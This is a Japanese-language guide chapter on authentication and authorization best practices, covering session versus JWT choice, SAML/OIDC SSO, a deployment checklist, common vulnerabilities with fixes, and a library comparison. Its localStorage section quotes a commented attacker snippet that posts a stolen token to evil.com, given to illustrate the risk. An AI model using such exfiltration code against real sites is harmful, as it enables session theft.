---
title: "ベストプラクティス集"
---

本章では、認証・認可の設計と実装における実践的なベストプラクティスを総まとめします。セッション方式とトークン方式の選定基準、SSO/SAML の導入判断、セキュリティチェックリスト、よくある脆弱性と対策、そして主要な認証認可ライブラリの比較を網羅的に解説します。

---

## セッション vs トークン選定ガイド

認証状態の管理には「セッション方式（ステートフル）」と「トークン方式（ステートレス）」の 2 つの主要なアプローチがあります。プロジェクト要件に応じた正しい選択が、セキュリティと開発効率の両面で重要です。

### 比較早見表

| 比較項目 | セッション方式 | トークン方式（JWT） |
|---------|-------------|------------------|
| 状態管理 | サーバー側（ステートフル） | クライアント側（ステートレス） |
| ストレージ | Redis / DB / メモリ | 不要（署名検証のみ） |
| スケーラビリティ | セッションストアの共有が必要 | ステートレスのためスケール容易 |
| 即時失効 | サーバー側で即時削除可能 | 有効期限まで失効不可（ブラックリスト要） |
| CSRF 耐性 | 脆弱（対策必須） | Authorization ヘッダーなら不要 |
| XSS 耐性 | HttpOnly Cookie で保護 | localStorage 保存は脆弱 |
| モバイル対応 | Cookie 管理が煩雑 | ヘッダーで簡単 |
| マイクロサービス | セッションストア共有が困難 | 各サービスで独立検証可能 |

### プロジェクトタイプ別の推奨方式

**Next.js / フルスタック Web アプリ**には、ハイブリッド方式（JWT in HttpOnly Cookie）を推奨します。SSR と SPA の両方に対応でき、CSRF/XSS 対策も兼ね備えています。

```typescript
// ハイブリッド方式: JWT を HttpOnly Cookie に保存
import { SignJWT, jwtVerify } from 'jose';
import { cookies } from 'next/headers';

async function login(userId: string, role: string) {
  const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
  const token = await new SignJWT({ sub: userId, role })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .sign(secret);

  const cookieStore = await cookies();
  cookieStore.set('access_token', token, {
    httpOnly: true,   // XSS 対策
    secure: true,     // HTTPS のみ
    sameSite: 'lax',  // CSRF 基本防御
    path: '/',
    maxAge: 15 * 60,
  });
}
```

**SPA + 別バックエンド API（同一ドメイン）** では、BFF（Backend for Frontend）経由の JWT in HttpOnly Cookie が適切です。BFF が Cookie を管理し、SPA 側はトークンを意識しません。

**モバイルアプリ + API** では、JWT を OS の Secure Storage（iOS Keychain / Android Keystore）に保存します。Cookie の概念がないモバイルでは、Authorization ヘッダーによるトークン送信が自然です。

**マイクロサービス間通信** では、JWT（ES256）と mTLS の併用を推奨します。各サービスが公開鍵だけで独立に検証でき、中央認可サーバーへの問い合わせが不要です。

**MPA（サーバーサイドレンダリング）** では、伝統的なセッション + Cookie が最もシンプルで安全です。フレームワーク（express-session 等）のサポートも充実しています。

**エンタープライズ（金融・医療）** では、即時失効が必須なためセッション方式を基本とし、SSO には SAML / OIDC を採用します。

### 選定フローチャート

```
モバイルネイティブアプリ？
  └─ Yes → JWT + Secure Storage + Refresh Token
  └─ No → マイクロサービス間通信？
      └─ Yes → JWT (ES256) + mTLS
      └─ No → 即時失効が必須？（金融・医療・コンプライアンス）
          └─ Yes → セッション方式（Redis ストア）
          └─ No → SPA or フルスタック Web？
              └─ Yes → ハイブリッド（JWT in HttpOnly Cookie）
              └─ No → MPA？
                  └─ Yes → セッション + Cookie
                  └─ No → 要件を詳細分析して選定
```

---

## SSO / SAML のベストプラクティス

### SSO プロトコルの選定

SSO（Single Sign-On）は、1 回のログインで複数アプリケーションにアクセスできる仕組みです。エンタープライズ顧客の 80% 以上が SSO を要求しており、B2B SaaS では事実上の必須要件になっています。

| 項目 | SAML 2.0 | OIDC |
|------|----------|------|
| データ形式 | XML | JSON |
| トークン | Assertion（XML署名） | ID Token（JWT） |
| 対象 | エンタープライズ中心 | コンシューマー + エンタープライズ |
| 複雑さ | 高い | 中程度 |
| モバイル対応 | XML パースが重い | JSON で軽量 |
| 策定年 | 2005年 | 2014年 |
| 主な IdP | Okta, Azure AD, OneLogin | Okta, Azure AD, Auth0, Google |

**SAML 2.0** は大企業の既存 IdP がSAML のみ対応している場合や、レガシーシステムとの連携に選択します。**OIDC** はモダンな IdP との連携やモバイル対応が必要な場合に適しています。理想的には**両方をサポート**し、顧客の要件に柔軟に対応できる設計にするのがベストです。

### SAML 実装時の注意点

1. **XML 署名の検証を必ず有効化する**: 署名検証を怠ると、任意のアサーションを受け入れてしまいます
2. **証明書のローテーションを計画する**: 証明書の期限切れ = SSO 停止 = 全ユーザーログイン不能です
3. **IdP Metadata の自動更新**: URL ベースの Metadata 取得で証明書更新に自動追従します
4. **RelayState の検証**: オープンリダイレクト攻撃の防止のため、許可リストで検証します

### OIDC 実装時の注意点

1. **PKCE を必ず使用する**: Authorization Code の横取り攻撃を防ぎます
2. **state パラメータで CSRF を防御する**: ログイン CSRF 攻撃への対策です
3. **nonce でリプレイ攻撃を防ぐ**: ID Token の再利用を検知できます
4. **ID Token の全クレームを検証する**: issuer、audience、有効期限、nonce のすべてを確認します

### マルチテナント SSO の設計

```typescript
// テナントごとの SSO 設定を管理するデータモデル例
interface OrganizationSSOConfig {
  ssoEnabled: boolean;
  ssoProvider: 'saml' | 'oidc' | null;
  enforceSSO: boolean;      // true: パスワードログイン禁止

  // SAML 設定
  ssoEntityId?: string;
  ssoSignOnUrl?: string;
  ssoCertificate?: string;  // IdP 署名証明書（PEM）

  // OIDC 設定
  ssoClientId?: string;
  ssoClientSecret?: string; // 暗号化保存
  ssoIssuer?: string;       // OIDC issuer URL
}
```

ログイン時にメールアドレスのドメインからテナントを特定し、SSO が有効なら IdP にリダイレクトします。`enforceSSO: true` のテナントではパスワードログインを完全にブロックし、セキュリティポリシーを強制します。

---

## セキュリティチェックリスト

本番環境にデプロイする前に、以下のチェックリストを確認してください。

### 認証の基盤

- [ ] パスワードは bcrypt / Argon2 でハッシュ化しているか
- [ ] ソルトはユーザーごとにユニークか（bcrypt は自動生成）
- [ ] パスワード強度の検証を実装しているか（最低 8 文字、よくあるパスワードの拒否）
- [ ] ログイン試行のレート制限を設定しているか（例: 5 回失敗で 15 分ロック）
- [ ] アカウントロックアウトポリシーを実装しているか

### セッション / トークン管理

- [ ] セッション ID は暗号的に安全な乱数（`crypto.randomBytes(32)`）で生成しているか
- [ ] Cookie に `HttpOnly`、`Secure`、`SameSite` 属性を設定しているか
- [ ] Access Token の有効期限は適切に短いか（15 分以下を推奨）
- [ ] Refresh Token Rotation を実装しているか
- [ ] Refresh Token はハッシュ化して DB に保存しているか
- [ ] ログアウト時にサーバー側のセッション / Refresh Token を確実に削除しているか
- [ ] JWT のアルゴリズムを `algorithms` パラメータで明示的に制限しているか

### 通信の保護

- [ ] 全通信を HTTPS で暗号化しているか
- [ ] HSTS（HTTP Strict Transport Security）を設定しているか
- [ ] CORS の `Access-Control-Allow-Origin` を適切に制限しているか（`*` の禁止）
- [ ] API レスポンスに `X-Content-Type-Options: nosniff` を設定しているか

### CSRF / XSS 対策

- [ ] Cookie 認証を使用する場合、CSRF トークンまたは SameSite 属性で防御しているか
- [ ] ユーザー入力をすべてサニタイズ / エスケープしているか
- [ ] Content-Security-Policy（CSP）ヘッダーを設定しているか
- [ ] トークンを `localStorage` に保存していないか

### SSO / エンタープライズ

- [ ] SAML の XML 署名を検証しているか
- [ ] SAML 証明書の有効期限を監視しているか
- [ ] OIDC の PKCE を有効にしているか
- [ ] SSO ログイン時にメールドメインの一致を検証しているか
- [ ] JIT プロビジョニング時に適切なデフォルトロールを設定しているか

### 監査とモニタリング

- [ ] ログイン / ログアウト / 失敗のイベントを記録しているか
- [ ] 不審なアクティビティ（多数の失敗、通常と異なる IP / デバイス）を検知しているか
- [ ] 監査ログに十分な情報（userId、IP、timestamp、userAgent）を含めているか
- [ ] 監査ログを改ざん防止のストレージに保存しているか

---

## よくある脆弱性と対策

### 1. JWT を localStorage に保存する（XSS 脆弱性）

**リスク**: XSS 脆弱性が 1 つでもあれば、攻撃者はトークンを窃取できます。

```javascript
// NG: XSS で簡単に窃取される
localStorage.setItem('access_token', token);

// 攻撃者のスクリプト:
// const token = localStorage.getItem('access_token');
// fetch('https://evil.com/steal', { method: 'POST', body: token });
```

**対策**: HttpOnly Cookie に保存し、JavaScript からアクセスできなくします。

### 2. JWT のアルゴリズム制限なし（alg:none 攻撃）

**リスク**: `algorithms` を指定しないと、攻撃者が `alg: "none"` に変更して署名なしのトークンを通過させたり、公開鍵を HMAC の秘密鍵として使うアルゴリズム混乱攻撃が可能になります。

```typescript
// NG: アルゴリズム未指定
jwt.verify(token, publicKey);

// OK: 許可アルゴリズムを明示
const { payload } = await jwtVerify(token, publicKey, {
  algorithms: ['ES256'],
  issuer: 'https://auth.example.com',
  audience: 'https://api.example.com',
});
```

### 3. JWT に機密情報を含める

**リスク**: JWT のペイロードは Base64URL エンコードであり、暗号化ではありません。誰でもデコードして内容を読み取れます。

```typescript
// NG: 機密情報を含む
const badPayload = {
  sub: 'user_123',
  password: 'hashed_password',     // 絶対 NG
  creditCard: '4111-1111-...',     // 絶対 NG
};

// OK: 必要最小限
const goodPayload = {
  sub: 'user_123',
  role: 'admin',
  org_id: 'org_456',
};
```

### 4. セッション ID に予測可能な値を使用

**リスク**: `Date.now()` や `Math.random()` は暗号的に安全ではなく、セッション ID を推測される可能性があります。

```typescript
// NG: 予測可能
const sessionId = `session_${Date.now()}`;

// OK: 暗号的に安全な乱数（256ビット）
import crypto from 'crypto';
const sessionId = crypto.randomBytes(32).toString('hex');
```

### 5. Refresh Token の再利用チェック漏れ

**リスク**: 窃取された Refresh Token が検知されずに使い続けられます。

**対策**: Refresh Token Rotation を実装し、使用済みトークンの再利用を検知したら、同一ファミリーの全トークンを即座に無効化します。

```typescript
// 使用済みトークンの再利用を検知
if (record.used) {
  // 同一ファミリーの全トークンを無効化
  await db.refreshToken.deleteMany({
    where: { family: record.family },
  });
  throw new Error('Token reuse detected');
}
```

### 6. CSRF 対策の不備

**リスク**: Cookie ベースの認証で CSRF トークンが未実装だと、攻撃者が被害者のブラウザを利用して意図しない操作を実行できます。

**対策**: `SameSite=Lax` を設定した上で、状態変更を伴うリクエストには Origin ヘッダーの検証を追加します。

### 7. オープンリダイレクト

**リスク**: ログイン後のリダイレクト先を検証しないと、攻撃者がフィッシングサイトに誘導できます。

**対策**: リダイレクト先を許可リストで検証するか、相対パスのみ許可します。

```typescript
function isValidRedirectUrl(url: string): boolean {
  // 相対パスのみ許可
  if (url.startsWith('/') && !url.startsWith('//')) {
    return true;
  }
  // 許可ドメインリスト
  const allowed = ['https://myapp.com', 'https://app.myapp.com'];
  return allowed.some(origin => url.startsWith(origin));
}
```

---

## 認証認可ライブラリ比較

### Node.js / TypeScript エコシステム

| ライブラリ | 特徴 | ユースケース | 学習コスト |
|-----------|------|------------|-----------|
| **NextAuth.js (Auth.js)** | Next.js 統合、多数のプロバイダー対応 | Next.js アプリの認証全般 | 低 |
| **Lucia** | 軽量、フレームワーク非依存、DB 直接操作 | 細かい制御が必要な場合 | 中 |
| **Passport.js** | Strategy パターン、Express 向け | Express ベースの MPA/API | 低 |
| **jose** | JWT/JWS/JWE の低レベル操作 | JWT の署名・検証処理 | 中 |
| **openid-client** | OIDC 準拠クライアント | OIDC/OAuth 2.0 フロー実装 | 中〜高 |
| **samlify** | SAML 2.0 SP/IdP 実装 | エンタープライズ SAML 連携 | 高 |

### マネージドサービス / IDaaS

| サービス | 特徴 | 料金帯（目安） | 推奨シーン |
|---------|------|--------------|-----------|
| **Auth0** | 豊富な機能、Universal Login | 無料〜（有料は $23/月〜） | スタートアップ〜中規模 |
| **Clerk** | DX 重視、React/Next.js 統合 | 無料〜（有料は $25/月〜） | Next.js アプリ |
| **Firebase Auth** | Google エコシステム統合 | 無料（電話認証のみ従量課金） | モバイル + Web |
| **AWS Cognito** | AWS サービス統合 | 50,000 MAU まで無料 | AWS ベースのシステム |
| **Supabase Auth** | PostgreSQL 統合、OSS | 無料〜 | Supabase ユーザー |
| **Okta / WorkOS** | エンタープライズ SSO 特化 | 要問合せ | B2B SaaS の SSO 対応 |

### ライブラリ選定の判断基準

```
個人開発 / プロトタイプ？
  └─ Yes → Firebase Auth or Supabase Auth（無料枠で十分）
  └─ No → Next.js を使用？
      └─ Yes → NextAuth.js (Auth.js) or Clerk
      └─ No → Express / Fastify ベース？
          └─ Yes → Passport.js + express-session
          └─ No → エンタープライズ SSO が必要？
              └─ Yes → WorkOS or 自前（openid-client + samlify）
              └─ No → Lucia（フレームワーク非依存）
```

自前実装が必要な場合でも、JWT の署名・検証には `jose` ライブラリを使い、OIDC フローには `openid-client` を使うことで、暗号処理の自前実装リスクを避けてください。**暗号やハッシュのアルゴリズムを独自実装するのは絶対に避けるべき**です。

---

## まとめ

本章で解説したベストプラクティスを総括します。

| カテゴリ | ベストプラクティス | 避けるべきこと |
|---------|-----------------|-------------|
| トークン保存 | HttpOnly Cookie に保存 | localStorage への保存 |
| Access Token | 有効期限 15 分以下 | 長時間有効な単一トークン |
| Refresh Token | Rotation + ハッシュ化保存 | 再利用チェック未実装 |
| JWT 検証 | algorithms を明示的に指定 | アルゴリズム制限なし |
| JWT ペイロード | 必要最小限の情報のみ | パスワードや個人情報を含める |
| セッション ID | crypto.randomBytes(32) | Date.now() や Math.random() |
| CSRF 対策 | SameSite + Origin 検証 | 対策なしの Cookie 認証 |
| パスワード | bcrypt / Argon2 でハッシュ化 | SHA-256 / MD5 / 平文保存 |
| SSO プロトコル | SAML + OIDC 両対応 | 片方のみ対応 |
| SAML 署名 | XML 署名を必ず検証 | 署名検証のスキップ |
| OIDC | PKCE + state + nonce | PKCE なしの Authorization Code |
| 証明書管理 | 有効期限の自動監視 | 期限切れまで放置 |
| リダイレクト | 許可リストで検証 | 未検証のオープンリダイレクト |
| ログ | 認証イベントの監査記録 | ログなし・不十分な情報 |
| ライブラリ | 検証済みの OSS / IDaaS | 暗号処理の自前実装 |

認証・認可はアプリケーションセキュリティの最も重要な基盤です。本書で解説してきた知識を活かし、安全で堅牢なシステムを構築してください。
